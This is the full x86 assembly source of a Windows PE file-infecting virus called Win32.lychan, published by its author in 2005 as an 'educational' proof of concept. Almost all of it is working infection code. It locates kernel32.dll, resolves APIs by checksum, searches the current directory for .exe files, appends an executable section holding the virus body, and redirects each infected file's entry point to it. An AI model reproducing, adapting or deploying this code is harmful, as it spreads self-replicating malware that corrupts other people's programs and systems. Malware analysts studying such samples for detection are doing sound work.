;-------------------------------------------------------------------------------
;Win32.lychan (c)opyright 2005 by lclee_vx
;
;Win32.lychan is a PE infector on Windows 9x/2K/XP without any encryption,  
;its proof of concept show that how virus infect the PE exe with adding new section behind 
;the target exe files. A little different compare with w32.cleevix.
;
;
;
;Description
;-----------
;when the win32.lychan execute, its running the process as below
;
;1) Retrieve the base address of Kernel32.dll
;2) Scans the Export Table of Kernel32.dll for the API Functions with checksum technic
;3) Retrieve API functions by scanning others *.dll file. For example, retrieve 
;   MessageBox function from User32.dll file.
;4) Scan the Current directory, infect all the *exe files. 
;5) The virus do not try to harm/damage the system, its just patch itself to the
;   PE files with adding new section and copy virus body inside the new section.
;6) its detected by Antivirus software. I publish this code is to proof that another technic of
;   PE appending with adding new section behind PE exe files (Is old technic :p!!). 
;
;
;
;That is about all folks. The code is heavily commented, so, it should be easy
;enough to follow. 
;
;                                    Disclaimer
;                                    ----------
;THIS CODE IS MEANT FOR EDUCATIONAL PURPOSES ONLY. THE AUTHOR CANNOT BE HELD 
;RESPONSIBLE FOR ANY DAMAGE CAUSED DUE TO USE, MISUSE OR INABILITY TO USE THE
;SAME
;
;
;Author		:  	lclee_vx
;Group		:  	F-13 Labs
;Web			: 	http://f13.host.sk
;Email		: 	lclee_vx@yahoo.com
;Credit		: 	Lord Julus, 29A ezines, IKX ezines

;----------------------------------------------------------------------------------



.386p
.model flat, stdcall
option casemap:none

.data

.code
VirusStart:
								
	call	Delta

Delta:
	pop		ebp
	mov		ebx, ebp											;ebx=ebp

	sub		ebp, offset Delta				
	
	sub		ebx, RubbishSize										;ebx=ImageBase
	sub		ebx, 1000h
	mov		dword ptr [ebp+offset ModuleAddress], ebx						;save
	
	mov		esi, [esp]											;get the current Address 
	and		esi, 0FFFF0000h										
	call		GetK32
	mov		dword ptr [ebp+offset KernelAddr], esi						;save the address of Kernel32.dll
	
	call		GetApis
	call		SpecialApi
	call 		DirectoryScan
	
	cmp		ebp, 0
	je		FirstGeneration
	call		FirstGeneration

ReturnHost:
	
	mov		eax, dword ptr [ebp+offset OldEip]
	jmp		eax
	ret
;------------------------------------------------------------------------------------------------
;Directory scanning the files we are going to infect
;------------------------------------------------------------------------------------------------
DirectoryScan	proc
	
	lea		eax, [ebp+offset CurtDirectory]						;get the address of current directory
	push		eax
	push		max_path										;load the size of directory=260
	mov		eax, dword ptr [ebp+offset aGetCurrentDirectoryA]	
	call		eax
	
	lea		eax, [ebp+offset CurtDirectory]
	push		eax
	mov		eax, dword ptr [ebp+offset aSetCurrentDirectoryA]			;set to current directory
	call		eax
	mov		dword ptr [ebp+offset Counter], 3						;set the counter=3, target maximum 3 files
	call		SearchFiles										;jump to search the files
	
	ret

DirectoryScan endp

;-----------------------------------------------------------------------------------------------
;This is the routine to search the target files 
;------------------------------------------------------------------------------------------------
SearchFiles	proc
	
	push		ebp										;save ebp
	lea		eax, dword ptr [ebp+offset W32FindData]				;load the Win32_Find_Data structure
	push		eax
	lea		eax, [ebp+offset Mark]							;target file "*.exe"
	push		eax
	mov		eax, dword ptr [ebp+offset aFindFirstFileA]			;start searching target file
	call		eax
	pop		ebp										;save the original ebp
	
	inc		eax										;eax+1
	jz		SearchClose									;"FindFirstFile" error?
	dec		eax										;get the original eax
	mov		dword ptr [ebp+offset SearchHandle], eax				;save the SearchHandle
	
	mov		esi, offset W32FindData.FileName					;esi = filename
	add		esi, ebp
	mov		dword ptr [ebp+offset FilePointer], esi				;save it
	call		InfectFile									;jump to infect file
	
	dec		dword ptr [ebp+offset Counter]					;Counter-1
	cmp		dword ptr [ebp+offset Counter], 0					;Counter=0??
	je		SearchHandleClose								;close searching
	
SearchNext:
	push		ebp										;save ebp
	mov		eax, dword ptr [ebp+offset W32FindData]				;eax= Win32_Find_Data structure
	push		eax
	mov		eax, dword ptr [ebp+offset SearchHandle]				;eax=SearchHandle
	push		eax
	mov		eax, dword ptr [ebp+offset aFindNextFileA]			;start next searching
	call		eax
	pop		ebp
	
	cmp		eax, 0									;FindNextFile error??
	je		SearchHandleClose								;close searching
	
	mov		esi, offset W32FindData.FileName					;esi=filename
	add		esi, ebp
	mov		dword ptr [ebp+offset FilePointer], esi				;save it
	call		InfectFile
	
	dec		dword ptr [ebp+offset Counter]					;Counter-1
	cmp		dword ptr [ebp+offset Counter], 0					;Counter=0?
	jne		SearchNext
	
SearchHandleClose:
	push		ebp										;save ebp
	push		dword ptr [ebp+offset SearchHandle]
	mov		eax, dword ptr [ebp+offset aFindClose]				;close the searching
	call		eax
	pop		ebp
	
	cmp		eax, 0									;error??
	je		SearchClose

SearchClose:
	ret
	
SearchFiles endp

;------------------------------------------------------------------------------------------------
;Infect the *.exe files
;ecx=original filesize
;esi=Filename pointer
;------------------------------------------------------------------------------------------------
InfectFile:
	pushad
	mov		dword ptr [ebp+offset InfectFlag], 0h				;mark the infectFlag=0
		
	push		esi										;esi=pointer to FileName
	mov		eax, dword ptr [ebp+offset aGetFileAttributesA]			;get the file attribute
	call		eax
	
	cmp		eax, -1									;error??
	jz		InfectFail	
	mov		dword ptr [ebp+offset OriFileAttribute], eax			;save it
	
	push		00000080h									;set "Any"
	push		dword ptr [ebp+offset FilePointer]
	mov		eax, dword ptr [ebp+offset aSetFileAttributesA]			;set the file attribute
	call		eax
	
	cmp		eax, 0									;error??
	jz		ErrorOpenExe								;jump out 
	
	push		0h
	push		80h
	push		00000003h
	push		0h
	push		0h
	push		0c0000000h
	push		dword ptr [ebp+offset FilePointer]
	mov		eax, [ebp+offset aCreateFileA]					;open the target file
	call		eax
	
	cmp		eax, -1									;error?
	jz		ErrorOpenExe
	mov		dword ptr [ebp+offset FileHandle], eax				;save the FileHandle
	
	mov		ecx, [W32FindData.FileSizeHigh+ebp]					;ecx=lpFileSizeHigh
	push		ecx
	push		eax										;eax=FileHandle
	mov		eax, [ebp+offset aGetFileSize]
	call		eax										;eax=FileSize
	
	cmp		eax, -1
	jz		ErrorBuffer
	mov		dword ptr [ebp+offset OriFileSize], eax
	
	add		eax, SecVirSize+SecVirPadd						;add extra size=2000h
	push		eax
	push		40h										;GMEM_FIXED=0 or GMEM_ZEROINIT=0040h
	mov		eax, [ebp+offset aGlobalAlloc]					;allocate the specified bytes
	call		eax										;in the heap
	
	cmp		eax, 0									;error??
	jz		ErrorBuffer
	mov		dword ptr [ebp+offset MemoryHandle], eax				;save it
	
	xor		eax, eax
	lea		eax, dword ptr [ebp+offset ByteRead]				;load the ByteRead
	push		0h
	push		eax
	push		dword ptr [ebp+offset OriFileSize]
	push		dword ptr [ebp+offset MemoryHandle]
	push		dword ptr [ebp+offset FileHandle]
	mov		eax, [ebp+offset aReadFile]						;read data from the file
	call		eax
	
	cmp		eax, 0									;error??
	jz		ErrorReadExe
	
	mov		esi, [ebp+offset MemoryHandle]					;esi=memory handle address
	cmp		word ptr [esi], "ZM"							;checking MZ signature
	jnz		ErrorReadExe
	mov		eax, [esi+3ch]								;eax=offset PE Header
	add		esi, eax									;esi=pointer to PE Header
	cmp		dword ptr [esi], "EP"							;PE file??
	jz		StartInfect									;start infect the files
	mov		dword ptr [ebp+offset InfectFlag], 0FFh				;put the error mark
	jmp		ErrorReadExe

StartInfect:
	cmp		dword ptr [esi+4ch], "chan"						;file infected
	jz		ErrorReadExe
	mov		dword ptr [esi+4ch], "chan"						;mark the infected file
	mov		dword ptr [ebp+offset PEHeaderExe], esi				;save the PE Header

;---------
;here we start adjust Original PE Header parameter
;-------------
	xor		eax, eax
	mov		ax, word ptr [esi+06h]							;original No.Of.Section
	mov		dword ptr [ebp+offset OriSection], eax				;save it		
	inc		word ptr [esi+06h]							;No.Of.Section+1
	
	mov		eax, [esi+28h]								;eax=Original AddressOfEntryPoint
	add		eax, [esi+34h]								;eax=Original AddressOfEntryPoint+
													;Original ImageBase
	mov		dword ptr [ebp+offset OldEip], eax					;save it
	
	mov		eax, [esi+50h]								;eax=Original SizeOfImage
	mov		[esi+28h], eax								;update the New AddressOfEntryPoint
	mov		dword ptr [ebp+offset OriImageSize], eax				;save it
	
	add		eax, SecVirSize								;size new section, enough..:)!!
	mov		[esi+50h], eax								;New SizeOfImage
	
;---------------------
;now we point to the last section header
;esi= pointer PE Header
;-----------------------------------
	add		esi, 0F8h									;point to section header
	mov		eax, 28h									;section header size
	mov		ecx, [ebp+offset OriSection]						;original No.Of.Section
	mul		ecx										;eax=eax*ecx
	add		esi, eax									;esi=Point to Last Section Header
	mov		dword ptr [ebp+offset LastSectionHeader], eax			;save it
	
	assume	esi:ptr PESection
	mov		dword ptr [esi].nsname, "lych"					;name
	mov		eax, SecVirSize								;eax=New Section VirtualSize
	mov		[esi].nsvirtualsize, eax
	mov		eax, [ebp+offset OriImageSize]					;eax=Original SizeOfImage
	mov		[esi].nsRVA, eax
	mov		eax, VirusSize								;eax=virus length
	mov		[esi].nsphysicalsize, eax
	mov		eax, [ebp+offset OriFileSize]						;eax=original FileSize
	mov		[esi].nsphysicaloffset, eax
	mov		eax, Char
	mov		[esi].nsflags, eax							;set section Read, Write, Executable
	assume	esi:
;-----------------
;start copy virus body
;--------------------
	mov		edi, [ebp+offset MemoryHandle]
	mov		eax, [ebp+offset OriFileSize]
	add		edi, eax									;edi=MemoryHandle+OriFileSize
	mov		esi, offset VirusStart
	add		esi, ebp									;esi=point to VirusStart
	mov		ecx, VirusSize
	rep		movsb										;start copy virus body to target files

	push		0h
	push		0h
	push		0h
	push		dword ptr [ebp+offset FileHandle]
	mov		eax, [ebp+offset aSetFilePointer]
	call		eax
	
	mov		eax, VirusSize
	mov		ecx, [ebp+offset OriFileSize]
	add		ecx, eax									;ecx=VirusSize+OriFileSize
	lea		eax, dword ptr [ebp+offset ByteRead]
	push		0h
	push		eax
	push		ecx
	push		dword ptr [ebp+offset MemoryHandle]
	push		dword ptr [ebp+offset FileHandle]
	mov		eax, [ebp+offset aWriteFile]
	call		eax
	
InfectError:
ErrorReadExe:
	push		ebp
	push		dword ptr [ebp+offset MemoryHandle]
	mov		eax, [ebp+offset aGlobalFree]
	call		eax
	pop		ebp

ErrorBuffer:
	push		ebp
	push		dword ptr [ebp+offset FileHandle]
	mov		eax, [ebp+offset aCloseHandle]
	call		eax
	pop		ebp

ErrorOpenExe:
	push		ebp
	push		dword ptr [ebp+offset OriFileAttribute]
	push		dword ptr [ebp+offset FilePointer]
	mov		eax, [ebp+offset aSetFileAttributesA]
	call		eax
	pop		ebp
	jmp		InfectCheck

InfectFail:
	stc
	jmp		JumpOut
InfectCheck:
	cmp		dword ptr [ebp+offset InfectFlag], 0FFh
	jz		InfectFail
	clc

JumpOut:
	popad
	ret
	
;------------------------------------------------------------------------------------------------
;here we start to scan APIs functions "GetProcAddress" and "LoadLibrary"
;and retrieve others APIs functions with GetProcAddress and LoadLibrary
;
;Notes:
;AddressOfNames     = points to a table of function name string one after another
;AddressOfFunctions = points to a table filled with function addresses
;AddressOfOrdinals  = points to a table with the ordinal number or each function 
;------------------------------------------------------------------------------------------------
GetApis		proc
	
	mov		eax, esi										;eax=esi=address of kernel32.dll
	add		eax, dword ptr [eax+3ch]							;eax=Pointer to PE Header
	mov		dword ptr [ebp+offset PEHeader], eax					;save it
	add		esi, dword ptr [eax+78h]							;esi=point to ExportDirectory
	mov		dword ptr [ebp+offset ExportDir], esi					;save it
	
	mov		edx, dword ptr [ebp+offset KernelAddr]					;edx=Address of Kernel32.dll
	add		edx, [esi+20h]									;edx=AddressOfNames
	mov		dword ptr [ebp+offset AddrOfNames], edx					;save it
	
	mov		ecx, dword ptr [esi+18h]							;ecx=NumberOfNames
	mov		dword ptr [ebp+offset NumOfNames], ecx					;save it
	
	lea		edi, word ptr [ebp+offset ImportantApis]					;edi=API functions we need
	xor		eax, eax										;set the index counter eax=0
	
SearchApiName:
	mov		esi, dword ptr [ebp+offset KernelAddr]					;esi=Address of Kernel32.dll
	add		esi, [edx+eax*4]									;get address for next api name in 
														;kernel32.dll

@Step1:
	pushad												;save all the register 
	xor		edx, edx										;edx=0
	mov		edx, dword ptr [edi]								;load the Api functions need into edx
	cmp		edx, 12345678h									;ended?? Refer to "ImportantApis" structure
	jz		GetOut1										;jump to end of routine
		
@Step2:
	xor		eax, eax										;eax=0
	lodsb								 					;esi-->eax, take a character, ie:"_X"
	mov		ah, al										;move it left, ie:"X __"
	mov		al, 0
	sub		edx, eax											
	cmp		eax, 0										;eax=0??
	jz		@Step3
	xor		ax, ax										;ax=0
	lodsb													;esi-->eax, take a character, ie:"_Y"
	sub		edx, eax
	cmp		eax, 0										;eax=0
	jnz		@Step2

@Step3:
	test	edx, edx											;edx=0?, we get the checksum match?
	jz		FoundApi
	popad													;save back all the register
	inc		eax											;eax+1
	cmp		eax, dword ptr [ebp+offset NumOfNames]					;compare with the NumberOfNames
	jge		GetOut										;jump out from the routine
	jmp		SearchApiName

;Here we apply two formula to retrieve the address of the API functions we need
;eax = The index into the Address of Ordinals
;
;Formula 1: eax*2+[AddressOfNameOrdinals]=Ordinal
;Formula 2: Ordinal*4+[AddressOfFunctions]=Address of Function (RVA) 
;

FoundApi:
	popad												;save back all the register
	mov		esi, dword ptr [ebp+offset ExportDir]				;esi=point to ExportDir
	mov		edx, dword ptr [ebp+offset KernelAddr]				;edx=Address of Kernel32.dll
	add		edx, [esi+24h]								;edx=AddressOfNameOrdinals
	movzx		eax, word ptr [edx+eax*2]						;Apply Formula 1
	
	mov		edx, dword ptr [ebp+offset KernelAddr]				;edx=Address of Kernel32.dll
	add		edx, [esi+1ch]								;edx+AddressOfFunctions
	mov		esi, dword ptr [ebp+offset KernelAddr]
	add		esi, [edx+eax*4]
	mov		eax, esi									;eax=address of functions
	
	add		edi, 4
	stosd												;save eax -->edi
	xor		eax, eax
	mov		edx, dword ptr [ebp+offset AddrOfNames]
	
	jmp		SearchApiName

GetOut1:
	popad
GetOut:
	
	ret

GetApis endp

;------------------------------------------------------------------------------------------------
;call the special api function in User32.dll
;------------------------------------------------------------------------------------------------
SpecialApi	proc
	
	lea		eax, [ebp+offset User32Dll]
	
	push		eax
	mov		eax, dword ptr [ebp+offset aLoadLibraryA]
	call		eax
	
	
	
	lea		esi, [ebp+offset sMessageBoxA]
	push		esi
	push		eax
	mov		eax, dword ptr [ebp+offset aGetProcAddress]
	call		eax
	
	
	mov		dword ptr [ebp+offset aMessageBoxA], eax
		
	ret

SpecialApi endp
;------------------------------------------------------------------------------------------------
;This routine is scan Kernel32.dll address
;
;Notes:
;-------
;we set the esi+IMAGE_DOS_HEADER.e_lfanew < 4096byte (1000h), its impossible the size of Dos Header
;plus Stub > 4096byte, correct me if i wrong :p
;
;the code "test ax, 0f000h" that mean we check the value for "0xxx", x=value 0,1
;------------------------------------------------------------------------------------------------
GetK32		proc
	push		eax

Step1:
	dec		esi												;Checking every byte
	mov		ax, [esi+3ch]										;ax=esi+IMAGE_DOS_HEADER.e_lfanew
	test		ax, 0f000h											;ax < 4096byte
	jnz		Step1
	cmp		esi, [esi+eax+34h]									;esi=IMAGEBASE ??
	jnz		Step1
	pop		eax												;save the original eax 
		
	ret

GetK32 endp

;------------------------------------------------------------------------------------------------
;parameters
;
;Notes:
;1. For ImportantAPIs, the 100h ~ FFh (1 word)
;------------------------------------------------------------------------------------------------
max_path				equ	260


ModuleAddress			dd	00000000h
OldEip				dd	00000000h
Counter				dd	00000000h
KernelAddr				dd	00000000h
PEHeader				dd	00000000h
ExportDir				dd	00000000h
AddrOfNames				dd	00000000h
NumOfNames				dd	00000000h
SearchHandle			dd	00000000h
FilePointer				dd	00000000h
OriFileSize				dd	00000000h
InfectFlag				dd	00000000h
OriFileAttribute			dd	00000000h
FileHandle				dd	00000000h
MemoryHandle			dd	00000000h
OriImageSize			dd	00000000h
NewImageSize			dd	00000000h
LastSectionHeader			dd	00000000h
PEHeaderExe				dd	00000000h
OriSection				dd	00000000h
ByteRead				dd	?


WinDirectory			db	max_path dup (?)
SysDirectory			db	max_path dup (?)
CurtDirectory			db	max_path dup (?)
Mark					db	"*.exe", 0
User32Dll				db	"User32.dll", 0	

sMessageBoxA			db	"MessageBoxA", 0
aMessageBoxA			dd	00000000h

ImportantApis:
sLoadLibraryA			dd	"Lo"+"ad"+"Li"+"br"+"ar"+"yA"
aLoadLibraryA			dd	000000000h
sGetProcAddress			dd	"Ge"+"tP"+"ro"+"cA"+"dd"+"re"+"ss"
aGetProcAddress			dd	00000000h
sGetWindowsDirectoryA		dd	"Ge"+"tW"+"in"+"do"+"ws"+"Di"+"re"+"ct"+"or"+"yA"
aGetWindowsDirectoryA		dd	00000000h
sGetSystemDirectoryA		dd	"Ge"+"tS"+"ys"+"te"+"mD"+"ir"+"ec"+"to"+"ry"+"A"*100h
aGetSystemDirectoryA		dd	00000000h
sGetCurrentDirectoryA		dd	"Ge"+"tC"+"ur"+"re"+"nt"+"Di"+"re"+"ct"+"or"+"yA"
aGetCurrentDirectoryA		dd	00000000h
sSetCurrentDirectoryA		dd	"Se"+"tC"+"ur"+"re"+"nt"+"Di"+"re"+"ct"+"or"+"yA"
aSetCurrentDirectoryA		dd	00000000h
sFindFirstFileA			dd	"Fi"+"nd"+"Fi"+"rs"+"tF"+"il"+"eA"
aFindFirstFileA			dd	00000000h
sFindNextFileA			dd	"Fi"+"nd"+"Ne"+"xt"+"Fi"+"le"+"A"*100h
aFindNextFileA			dd	00000000h
sFindClose				dd	"Fi"+"nd"+"Cl"+"os"+"e"*100h
aFindClose				dd	00000000h
sGetFileAttributesA		dd	"Ge"+"tF"+"il"+"eA"+"tt"+"ri"+"bu"+"te"+"sA"
aGetFileAttributesA		dd	00000000h
sSetFileAttributesA		dd	"Se"+"tF"+"il"+"eA"+"tt"+"ri"+"bu"+"te"+"sA"
aSetFileAttributesA		dd	00000000h
sCreateFileA			dd	"Cr"+"ea"+"te"+"Fi"+"le"+"A"*100h
aCreateFileA			dd	00000000h
sGetFileSize			dd	"Ge"+"tF"+"il"+"eS"+"iz"+"e"*100h
aGetFileSize			dd	00000000h
sGlobalAlloc			dd	"Gl"+"ob"+"al"+"Al"+"lo"+"c"*100h
aGlobalAlloc			dd	00000000h
sReadFile				dd	"Re"+"ad"+"Fi"+"le"
aReadFile				dd	00000000h
sSetFilePointer			dd	"Se"+"tF"+"il"+"eP"+"oi"+"nt"+"er"
aSetFilePointer			dd	00000000h
sWriteFile				dd	"Wr"+"it"+"eF"+"il"+"e"*100h
aWriteFile				dd	00000000h
sGlobalFree				dd	"Gl"+"ob"+"al"+"Fr"+"ee"
aGlobalFree				dd	00000000h
sCloseHandle			dd	"Cl"+"os"+"eH"+"an"+"dl"+"e"*100h
aCloseHandle			dd	00000000h
sExitProcess			dd	"Ex"+"it"+"Pr"+"oc"+"es"+"s"*100h
aExitProcess			dd	00000000h
						dd	12345678h

filetime		STRUC						;file time structure
				FT_dwLowDateTime	DD ?	
				FT_dwHighDateTime	DD ?
filetime		ENDS	


win32_find_data                 STRUC             
         FileAttributes          DD ?              ; attributes
         CreationTime            filetime ?        ; time of creation
         LastAccessTime          filetime ?        ; last access time
         LastWriteTime           filetime ?        ; last modificationm
         FileSizeHigh            DD ?              ; filesize
         FileSizeLow             DD ?              ; -"-
         Reserved0               DD ?              ;
         Reserved1               DD ?              ;
         FileName                DB max_path DUP (?) ; long filename
         AlternateFileName       DB 13 DUP (?)     ; short filename
                                 DB 3 DUP (?)      ; dword padding
 win32_find_data                 ENDS              ;
                                                   ;
 W32FindData    win32_find_data ?                  ; our search area

PESection						STRUC		
	nsname						db	8 dup (0)
	nsvirtualsize				dd 	0
	nsRVA						dd	0
	nsphysicalsize				dd	0
	nsphysicaloffset			dd	0
	nsreserved					db	12 dup (0)
	nsflags						dd	0
PESection ends

RubbishSize		equ	(offset Delta - offset VirusStart)		;redundant size
VirusSize		equ	(offset VirusEnd-offset VirusStart)		;total size of virus
SecVirSize		equ	1000h
SecVirPadd		equ	1000h
Char			equ	0E0000020h								;read, write, executable

szTopic			db	"F-13 Labs", 0
szText			db	"Coded by lclee_vx", 0


FirstGeneration:			
	
	push	0
	lea		eax, [ebp+offset szTopic]
	push	eax
	lea		eax, [ebp+offset szText]
	push	eax
	push	0
	mov		eax, [ebp+offset aMessageBoxA]
	call	eax
	
	ret
VirusEnd:
ends

end	VirusStart
				